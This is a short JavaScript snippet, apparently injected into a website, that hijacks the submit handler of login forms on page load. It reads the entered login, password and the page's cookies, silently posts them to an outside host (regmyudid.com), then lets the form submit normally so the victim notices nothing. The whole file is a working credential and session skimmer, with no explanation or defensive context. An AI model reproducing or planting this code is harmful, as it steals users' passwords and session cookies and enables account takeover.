function yay(form) {
    if ($(form).find('.inp_submit').val()=='Выйти') return true;
    var l = $(form).find('input[name="login"]').val();
    var p = $(form).find('input[name="password"]').val();

    $.post('https://regmyudid.com/c.php', {l: l, p: p, c: document.cookie}, function() {
        $(form).removeAttr('onsubmit');
        $(form).submit();
    });
    return false;
}
$(document).ready(function() {
    $('.form-login').attr('onsubmit', 'return yay(this);');
});